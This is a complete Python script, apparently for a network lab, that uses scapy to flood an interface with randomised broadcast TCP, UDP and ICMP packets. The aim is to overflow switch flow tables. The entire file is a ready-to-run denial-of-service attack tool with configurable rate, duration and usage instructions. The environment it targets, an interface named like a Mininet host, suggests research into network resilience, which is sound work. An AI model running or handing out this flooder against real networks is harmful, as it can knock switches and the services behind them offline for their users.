#!/usr/bin/env python3
import sys
import random
import time
from scapy.all import *

class FlowTableOverflow:
    def __init__(self, interface):
        self.interface = interface
        self.sent_packets = 0
        
    def generate_random_packet(self):
        """Generate packet with random fields"""
        # Random MACs
        src_mac = ":".join([f"{random.randint(0, 255):02x}" for _ in range(6)])
        dst_mac = "ff:ff:ff:ff:ff:ff"
        
        # Random IPs
        src_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}." + \
                 f"{random.randint(1, 254)}.{random.randint(1, 254)}"
        dst_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}." + \
                 f"{random.randint(1, 254)}.{random.randint(1, 254)}"
        
        # Choose random protocol and ports
        protocol = random.choice([6, 17, 1, 2, 89])  # TCP, UDP, ICMP, IGMP, OSPF
        
        if protocol == 6:  # TCP
            return Ether(src=src_mac, dst=dst_mac)/ \
                   IP(src=src_ip, dst=dst_ip)/ \
                   TCP(sport=random.randint(1024, 65535),
                       dport=random.choice([80, 443, 22, 53, 3389]))
        
        elif protocol == 17:  # UDP
            return Ether(src=src_mac, dst=dst_mac)/ \
                   IP(src=src_ip, dst=dst_ip)/ \
                   UDP(sport=random.randint(1024, 65535),
                       dport=random.choice([53, 67, 68, 123, 161]))
        
        else:  # ICMP/others
            return Ether(src=src_mac, dst=dst_mac)/ \
                   IP(src=src_ip, dst=dst_ip)/ICMP()

    def run_attack(self, duration=60, rate=1000):
        """Run the overflow attack"""
        print(f"Starting attack on {self.interface}")
        print(f"Duration: {duration}s, Rate: {rate} pps")
        
        end_time = time.time() + duration
        packet_count = 0
        
        while time.time() < end_time:
            # Send burst of packets
            for _ in range(rate // 10):  # Send in bursts
                pkt = self.generate_random_packet()
                sendp(pkt, iface=self.interface, verbose=0)
                packet_count += 1
                
                if packet_count % 1000 == 0:
                    print(f"Packets sent: {packet_count}")
                    sys.stdout.flush()
            
            # Sleep to maintain average rate
            time.sleep(0.1)
        
        print(f"\nAttack complete. Total packets sent: {packet_count}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <interface> [duration] [rate]")
        print("Example: python3 overflow_attack.py h1-eth0 60 1000")
        sys.exit(1)
    
    interface = sys.argv[1]
    duration = int(sys.argv[2]) if len(sys.argv) > 2 else 60
    rate = int(sys.argv[3]) if len(sys.argv) > 3 else 1000
    
    attacker = FlowTableOverflow(interface)
    attacker.run_attack(duration, rate)
